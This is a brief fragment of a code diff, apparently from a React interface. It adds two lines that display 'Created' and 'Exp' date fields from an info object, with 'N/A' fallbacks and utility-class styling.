+                        <div><span className="text-white/30 theme-text-dim">Created: </span><span className="text-white/70 theme-text">{info?.created_at || 'N/A'}</span></div>
+                        <div><span className="text-white/30 theme-text-dim">Exp: </span><span className="text-white/70 theme-text">{info?.exp_date || 'N/A'}</span></div>
                       </div>
 
                       <div className="mt-2 flex items-center gap-2">
